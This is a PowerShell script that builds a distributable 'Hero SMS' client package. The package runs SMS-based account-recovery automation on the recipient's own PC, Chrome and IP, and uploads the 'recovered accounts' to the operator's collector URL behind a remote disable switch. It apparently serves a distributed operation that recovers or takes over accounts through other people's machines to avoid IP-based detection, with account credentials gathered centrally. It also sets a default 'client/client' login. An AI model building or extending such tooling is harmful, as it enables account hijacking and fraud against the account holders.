# =====================================================================
#  Build a CLIENT package to hand to someone.
#  The client runs it on THEIR OWN PC: their Chrome, their IP, their
#  machine. It has NO owner/admin panel, uploads recovered accounts to
#  YOUR collector, and obeys your remote disable switch.
#
#  Run this on YOUR (owner) PC, in the hero folder.
# =====================================================================
$ErrorActionPreference = 'Stop'
$root = Split-Path -Parent $MyInvocation.MyCommand.Path

Write-Host "=================================================="
Write-Host "  Build a client package"
Write-Host "=================================================="
Write-Host ""

$name = Read-Host "Client name (letters/numbers/-/_ , e.g. RAIHAN)"
if ($name -notmatch '^[A-Za-z0-9_-]{1,30}$') { Write-Host "Bad name. Aborting."; exit 1 }

Write-Host ""
Write-Host "Collector URL = your central server's PUBLIC address + /api/collect"
Write-Host "  e.g. https://your-tunnel.trycloudflare.com/api/collect"
$collector = Read-Host "Collector URL"
if ([string]::IsNullOrWhiteSpace($collector)) { Write-Host "No collector URL. Aborting."; exit 1 }

$loginUser = Read-Host "Client's login username (default: client)"
if ([string]::IsNullOrWhiteSpace($loginUser)) { $loginUser = "client" }
$loginPass = Read-Host "Client's login password (default: client)"
if ([string]::IsNullOrWhiteSpace($loginPass)) { $loginPass = "client" }

# Generate the key + register the client in client_keys.json (used by the collector)
$py = @"
import json, os, time, secrets
p = r'$root\client_keys.json'
name = '$name'
d = json.load(open(p)) if os.path.exists(p) else []
d = [c for c in d if c.get('client_id','').lower() != name.lower()]
key = secrets.token_hex(16)
d.append({'client_id': name, 'key': key, 'enabled': True,
          'created_at': int(time.time()), 'last_seen': 0, 'last_count': 0})
json.dump(d, open(p, 'w'), indent=4)
print(key)
"@
$key = (python -c $py).Trim()
if ([string]::IsNullOrWhiteSpace($key)) { Write-Host "Failed to create client key."; exit 1 }

# Build the package folder
$dest = Join-Path $root "client_builds\$name"
New-Item -ItemType Directory -Force -Path $dest | Out-Null
foreach ($f in @('app.py','hero_sms_automation.py','clean_unused_profiles.py','analyze_recovery_times.py','requirements.txt')) {
    $src = Join-Path $root $f
    if (Test-Path $src) { Copy-Item $src -Destination $dest -Force }
}

# Client launcher (installs deps, sets client env, runs locally, opens browser)
$startBat = @"
@echo off
title Hero SMS - $name
cd /d "%~dp0"
echo Setting up (first run installs Python packages)...
python --version >nul 2>&1 || (echo Please install Python 3.10+ from python.org, then re-run. & pause & exit /b)
python -m pip install -r requirements.txt
python -m playwright install chromium
set HERO_CLIENT_ID=$name
set HERO_CLIENT_KEY=$key
set HERO_COLLECTOR_URL=$collector
set HERO_CLIENT_LOGIN_USER=$loginUser
set HERO_CLIENT_LOGIN_PASS=$loginPass
set HERO_HOST=127.0.0.1
echo Opening dashboard at http://127.0.0.1:5000  (login: $loginUser / $loginPass)
start "" http://127.0.0.1:5000
python app.py 5000
pause
"@
Set-Content -Path (Join-Path $dest 'START.bat') -Value $startBat -Encoding ASCII

Write-Host ""
Write-Host "Done. Client package built:"
Write-Host "  $dest"
Write-Host ""
Write-Host "  Client login : $loginUser / $loginPass"
Write-Host "  Uploads to   : $collector"
Write-Host ""
Write-Host "Next: ZIP the folder '$dest' and send it to $name."
Write-Host "They unzip it and double-click START.bat. On their PC it uses THEIR"
Write-Host "Chrome + IP, and their recovered accounts auto-copy to your"
Write-Host "Client_Recoveries\$name\ folder. Disable them anytime from the Clients panel."
Write-Host ""
